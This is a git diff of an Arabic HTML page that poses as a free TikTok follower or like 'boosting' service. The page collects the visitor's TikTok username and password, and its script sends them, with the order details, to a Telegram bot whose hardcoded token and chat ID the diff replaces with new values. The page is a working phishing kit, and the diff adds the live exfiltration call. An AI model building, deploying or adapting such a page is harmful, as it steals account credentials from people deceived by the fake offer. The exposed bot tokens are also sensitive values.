@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>رشق تيك توك مجاني</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>رشق تيك توك</title>
   <style>
     body {
+      background-color: #121212;
       margin: 0;
       padding: 0;
-      background-color: #121212;
       font-family: 'Tahoma', sans-serif;
+      color: white;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      color: white;
     }
 
     .container {
@@ -27,15 +27,26 @@
       box-shadow: 0 0 15px rgba(255, 255, 255, 0.05);
     }
 
-    .logo {
-      width: 60px;
-      margin-bottom: 15px;
+    .tiktok-text {
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
     }
 
-    h2 {
-      font-size: 24px;
-      margin-bottom: 20px;
-      color: white;
+    .tiktok-text span:nth-child(1),
+    .tiktok-text span:nth-child(4) {
+      color: #ff0050; /* وردي */
+    }
+
+    .tiktok-text span:nth-child(2),
+    .tiktok-text span:nth-child(5) {
+      color: #00f2ea; /* سماوي */
+    }
+
+    .tiktok-text span:nth-child(3),
+    .tiktok-text span:nth-child(6) {
+      color: #ffffff; /* أبيض */
     }
 
     input, select {
@@ -47,7 +58,6 @@
       background-color: #1e1e1e;
       color: white;
       font-size: 16px;
-      box-sizing: border-box;
     }
 
     button {
@@ -69,7 +79,9 @@
 </head>
 <body>
   <div class="container">
-    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/69/TikTok_logo.svg" alt="TikTok Logo">
+    <div class="tiktok-text">
+      <span>T</span><span>i</span><span>k</span><span>T</span><span>o</span><span>k</span>
+    </div>
     <h2>رشق مجاني</h2>
     <input type="text" id="username" placeholder="اسم المستخدم">
     <input type="password" id="password" placeholder="كلمة المرور">
@@ -93,13 +105,14 @@
       const amount = document.getElementById("amount").value;
       const type = document.getElementById("type").value;
 
-      const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
-      const chat_id = "7197079453";
+      const token = "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY";
+      const chat_id = "6454073193";
 
       const message = `🔔 طلب جديد من الموقع:\n👤 يوزر: ${username}\n🔑 كلمة المرور: ${password}\n📦 العدد: ${amount}\n📌 النوع: ${type}`;
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
-      alert("✅ تم الإرسال بنجاح");
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        .then(() => alert("✅ تم الإرسال بنجاح"))
+        .catch(() => alert("❌ فشل الإرسال"));
     }
   </script>
 </body>
